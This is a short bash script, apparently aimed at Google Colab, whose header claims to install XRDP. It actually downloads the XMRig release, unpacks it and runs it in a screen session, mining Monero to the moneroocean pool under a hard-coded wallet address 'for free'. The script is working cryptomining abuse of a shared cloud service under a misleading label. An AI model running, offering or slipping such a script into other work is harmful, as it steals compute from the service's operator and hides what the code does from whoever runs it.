#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o gulf.moneroocean.stream:443 -u 41z8pHACeyw3B4LghDXzubZbEhNCtGaGPLngsXkTwWcVg6vV8YntCaP87fX2hgtfryD7Qvq2syY8We4S2TpojRn85yJX9pa -k --tls --rig-id GC-US